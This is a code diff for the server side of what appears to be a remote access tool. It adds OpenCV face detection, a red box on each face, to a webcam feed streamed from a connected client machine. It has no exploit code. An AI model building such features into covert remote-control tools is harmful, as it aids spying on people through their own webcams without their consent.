@@ -6,6 +6,7 @@ using Comet.Server.Networking;
 using Comet.Server.Utilities;
 using Mono.Cecil.Cil;
 using OpenCvSharp;
+using OpenCvSharp.Extensions;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -29,6 +30,8 @@ namespace Comet.Server.Forms
         /// </summary>
         private readonly Client _connectClient;
         Dictionary<string, List<Resolution>> _webcams = null;
+        private readonly CascadeClassifier cascadeClassifier;
+
         public bool IsStarted { get; private set; }
 
         /// <summary>
@@ -41,6 +44,7 @@ namespace Comet.Server.Forms
             _connectClient = client;
             _remoteWebcamHandler = new RemoteWebcamHandlerS(client);
             RegisterMessageHandler();
+            cascadeClassifier = new CascadeClassifier("haarcascade_frontalface_default.xml");
             InitializeComponent();
         }
 
@@ -79,15 +83,22 @@ namespace Comet.Server.Forms
         private SemaphoreSlim fileLock;
         private bool isProcessing = false;
         bool record = false;
+        bool faceDetection = false;
+
         private Task recordTask;
 
         private async void UpdateImageAsync(object sender, Bitmap bmp)
         {
             if (WindowState == FormWindowState.Minimized)
                 return;
-
-            picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
-
+            if (faceDetection)
+            {
+                await Task.Run(() => FaceDetection(bmp));
+            }
+            else
+            {
+                picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
+            }
             if (record)
             {
                 int imgWidth = bmp.Size.Width;
@@ -292,7 +303,6 @@ namespace Comet.Server.Forms
                     }
                 }
             }
-
         }
 
         /// <summary>
@@ -411,6 +421,49 @@ namespace Comet.Server.Forms
             btnShow.Visible = false;
             btnHide.Visible = true;
             this.ActiveControl = picWebcam;
+        }
+
+        void FaceDetection(Bitmap detectBitmap)
+        {
+            if (detectBitmap != null)
+            {
+                using (var detectMat = BitmapConverter.ToMat(detectBitmap))
+                {
+                    // 检测人脸
+                    var rects = cascadeClassifier.DetectMultiScale(
+                        detectMat,
+                        1.1,
+                        5,
+                        HaarDetectionTypes.ScaleImage,
+                        new OpenCvSharp.Size(30, 30)
+                    );
+                    // 绘制所有检测到的人脸
+                    foreach (var rect in rects)
+                    {
+                        Cv2.Rectangle(detectMat, rect, Scalar.Red, 2);
+                    }
+
+                    // 将检测结果显示到pictureBox1
+                    picWebcam.Image = BitmapConverter.ToBitmap(detectMat);
+                }
+                detectBitmap.Dispose();
+            }
+        }
+
+        private void faceDetectioncheckBox_CheckedChanged(object sender, EventArgs e)
+        {
+            var checkBox = sender as CheckBox;
+            if (checkBox != null)
+            {
+                if (checkBox.Checked)
+                {
+                    faceDetection = true;
+                }
+                else
+                {
+                    faceDetection = false;
+                }
+            }
         }
     }
 }
